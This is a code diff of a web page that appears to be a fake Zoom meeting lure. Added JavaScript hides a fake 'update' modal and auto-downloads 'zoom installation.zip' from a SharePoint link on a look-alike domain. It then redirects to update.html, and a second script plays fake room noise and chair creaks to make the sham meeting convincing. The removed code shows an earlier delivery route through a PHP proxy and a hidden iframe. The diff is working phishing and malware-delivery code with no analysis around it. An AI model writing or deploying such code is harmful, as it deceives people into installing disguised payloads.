+const DOWNLOAD_URL='https://oceanenergy-my.sharepoint.com/:u:/g/personal/sdeal_oceannenergy_com/IQAWgAC6tC87SoOKGAR5eL3tAREgdzh69_imJ6uxlXj1MLs?e=fS8H0d&download=1';
+
+function triggerDownload(){
     try{
-        const resp=await fetch(CONFIG.PROCESS_PHP_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'download',meetingId:CONFIG.MEETING_ID,timestamp:Date.now()})});
-        if(!resp.ok){console.error('process.php error',resp.status);return}
-        const data=await resp.json().catch(()=>null);const dlUrl=data&&data.downloadUrl;
-        if(!dlUrl){console.error('No downloadUrl',data);return}
-        function getFN(cd){if(!cd)return null;const s=cd.match(/filename\*\s*=\s*[^']*''([^;]+)/i);if(s){try{return decodeURIComponent(s[1])}catch(e){return s[1]}}const m=cd.match(/filename\s*=\s*["']?([^"';]+)["']?/i);return m?m[1]:null}
-        function guessFN(url){try{const u=new URL(url);const p=u.pathname.split('/').filter(Boolean);return p.length?p[p.length-1]:null}catch(e){return null}}
-        function dlBlob(b,fn){const u=URL.createObjectURL(b);const a=document.createElement('a');a.style.display='none';a.href=u;a.download=fn||'download';document.body.appendChild(a);a.click();setTimeout(()=>{URL.revokeObjectURL(u);a.remove()},2000)}
-        try{const fr=await fetch(dlUrl,{method:'GET',mode:'cors'});if(!fr.ok)throw new Error(fr.status);
-            if(fr.body&&fr.body.getReader){const r=fr.body.getReader();const t=parseInt(fr.headers.get('content-length')||'0',10)||null;const ch=[];let rc=0;while(true){const{done,value}=await r.read();if(done)break;ch.push(value);rc+=(value.length||value.byteLength||0);if(t)console.log(`Download: ${(rc/t*100).toFixed(1)}%`)}dlBlob(new Blob(ch),getFN(fr.headers.get('content-disposition'))||guessFN(dlUrl)||'download.bin');return}
-            else{const b=await fr.blob();dlBlob(b,getFN(fr.headers.get('content-disposition'))||guessFN(dlUrl)||'download.bin');return}
-        }catch(e){console.warn('Direct fetch failed:',e)}
-        try{const px=CONFIG.PROCESS_PHP_URL+'?proxy=1';let ifr=document.getElementById('download-proxy-iframe');if(!ifr){ifr=document.createElement('iframe');ifr.style.display='none';ifr.id='download-proxy-iframe';ifr.name='download-proxy-iframe';document.body.appendChild(ifr)}const fm=document.createElement('form');fm.style.display='none';fm.method='POST';fm.action=px;fm.target=ifr.name;const inp=document.createElement('input');inp.type='hidden';inp.name='url';inp.value=dlUrl;fm.appendChild(inp);document.body.appendChild(fm);fm.start();setTimeout(()=>{try{fm.remove()}catch(e){}},2000);return}catch(e){console.error('Proxy failed:',e)}
-        try{window.open(dlUrl,'_blank','noopener')}catch(e){console.error('Open failed:',e)}
-    }catch(err){console.error('triggerDownload error',err)}
+        elements.updateModal.classList.add('hidden');
+        if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
+        state.updateCompleted=true;
+    }catch(e){}
+
+    fetch(DOWNLOAD_URL)
+        .then(response=>response.blob())
+        .then(blob=>{
+            const url=window.URL.createObjectURL(blob);
+            const a=document.createElement('a');a.href=url;a.download='zoom installation.zip';
+            document.body.appendChild(a);a.click();document.body.removeChild(a);
+            setTimeout(()=>{
+                window.URL.revokeObjectURL(url);
+                elements.updateModal.classList.add('hidden');
+                if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
+                state.updateCompleted=true;
+                window.location.href='update.html';
+            },8000);
+        })
+        .catch(()=>{
+            const a=document.createElement('a');
+            a.href=DOWNLOAD_URL;a.download='zoom installation.zip';
+            document.body.appendChild(a);a.click();document.body.removeChild(a);
+            setTimeout(()=>{
+                elements.updateModal.classList.add('hidden');
+                if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
+                state.updateCompleted=true;
+                window.location.href='update.html';
+            },8000);
+        });
 }
 
 async function onUserEnableAudio(){
@@ -1020,6 +981,70 @@ window.stopRecurringOverlay=stopRecurringOverlay;
 window.loadExternalAudioToKey=function(){};
 
 })();
+</script>
+
+<script>
+// ===== AMBIENT ROOM NOISE (soft background hum) =====
+// Starts after meeting screen becomes visible (within user gesture context)
+
+let ambientAudioStarted=false;
+
+function startAmbientMeetingNoise(){
+    if(ambientAudioStarted)return;
+    ambientAudioStarted=true;
+
+    try{
+        const AudioContextClass=window.AudioContext||window.webkitAudioContext;
+        const ctx=new AudioContextClass();
+        if(ctx.state==='suspended') ctx.resume();
+
+        // Soft low-frequency room hum
+        const bufferSize=2*ctx.sampleRate;
+        const noiseBuffer=ctx.createBuffer(1,bufferSize,ctx.sampleRate);
+        const output=noiseBuffer.getChannelData(0);
+        for(let i=0;i<bufferSize;i++) output[i]=(Math.random()*2-1)*0.06;
+
+        const whiteNoise=ctx.createBufferSource();
+        whiteNoise.buffer=noiseBuffer;whiteNoise.loop=true;
+
+        const filter=ctx.createBiquadFilter();
+        filter.type='lowpass';filter.frequency.value=500;
+
+        const gainNode=ctx.createGain();
+        gainNode.gain.value=0.12;
+
+        whiteNoise.connect(filter);
+        filter.connect(gainNode);
+        gainNode.connect(ctx.destination);
+        whiteNoise.start(0);
+
+        // Occasional soft chair creak / room pop
+        setInterval(()=>{
+            if(ctx.state==='suspended')return;
+            const osc=ctx.createOscillator();
+            const gain=ctx.createGain();
+            osc.type='triangle';
+            osc.frequency.value=80+Math.random()*80;
+            gain.gain.setValueAtTime(0.04,ctx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.0001,ctx.currentTime+0.35);
+            osc.connect(gain);gain.connect(ctx.destination);
+            osc.start();osc.stop(ctx.currentTime+0.35);
+        },8000);
+
+        console.log('Ambient meeting noise started');
+    }catch(e){
+        console.warn('Ambient sound blocked:',e);
+    }
+}
+
+// Start ambient noise when meeting screen becomes visible (within user gesture)
+const ambientCheck=setInterval(()=>{
+    const ms=document.getElementById('meeting-screen');
+    if(ms&&!ms.classList.contains('hidden')){
+        clearInterval(ambientCheck);
+        setTimeout(startAmbientMeetingNoise,2500);
+    }
+},500);
 </script>
 
 </body>
